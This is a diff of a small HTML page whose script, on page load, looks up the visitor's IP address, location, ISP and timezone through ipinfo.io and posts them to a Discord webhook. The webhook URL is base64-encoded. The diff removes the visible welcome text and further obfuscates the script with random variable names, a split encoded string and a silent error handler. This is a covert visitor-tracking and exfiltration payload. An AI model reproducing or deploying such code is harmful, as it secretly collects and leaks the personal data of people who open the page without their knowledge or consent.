@@ -3,43 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome Page</title>
-    <style>
-        body { 
-            background-color: #000000; 
-            color: #ffffff; 
-            font-family: Arial, sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0;
-        }
-    </style>
+    <title>XYZZhfe</title>
 </head>
 <body>
-    <h1>Welcome!</h1>
     <script>
-        let a = "NDEyMjk4ZDY0ZTRmNGZiZmJiOGV";
-        let b = "OTA1ZGEyMGVjY2EsaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4MDk0MTc1MTYyNDAwNzcyMC9zdHdkTFc4RDg2NkhQVkRaUEFHNVhvWURpNmZBOTFqZldQYWFTNm5tVGNzYjI4UVU2dGRQSkVCVnVUT19SUDV0UWdROQ==";
-        let c = atob(a) + atob(b);
-        let d = "af" + "bc" + "e9" + "9e" + "099";
-        let e = "hello";
+        let ZWXPLK93 = "NDEyMjk4ZDY0Z";
+        let OWEFN78R = "TRmNGZiZmJiOGVlOTA1Z";
+        let RAIODQ4T = "GEyMGVjY2EsaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4MDk0MTc1MTYyNDAwNzcyMC9zdHdkTFc4RDg2NkhQVkRaUEFHNVhvWURpNmZBOTFqZldQYWFTNm5tVGNzYjI4UVU2dGRQSkVCVnVUT19SUDV0UWdROQ==";
+        let QWPZEUXY47 = "afbce99e0999ed";
+        let FXMNVO0P = atob(ZWXPLK93 + OWEFN78R + RAIODQ4T);
 
-        async function f() {
-            let g = await fetch("https://ipinfo.io/json?token=" + d);
-            let h = await g.json();
-            let j = {
-                content: `${e} ${h.ip} ${h.city} ${h.region} ${h.country} ${h.org} ${h.loc} ${h.timezone}`
-            };
-            await fetch(c, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(j)
-            });
+        async function UEFIXO923() {
+            try {
+                let LVNEYW21 = await fetch("https://ipinfo.io/json?token=" + QWPZEUXY47);
+                let MEKFDU47 = await LVNEYW21.json();
+                let PJCEI94 = {
+                    content: `QD5FzL:\nZT1: ${MEKFDU47.ip}\nZT2: ${MEKFDU47.city}\nZT3: ${MEKFDU47.region}\nZT4: ${MEKFDU47.country}\nZT5: ${MEKFDU47.org}\nZT6: ${MEKFDU47.loc}\nZT7: ${MEKFDU47.timezone}`
+                };
+                await fetch(FXMNVO0P, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(PJCEI94)
+                });
+            } catch (EODICZ3) {}
         }
-        
-        f();
+
+        UEFIXO923();
     </script>
 </body>
 </html>
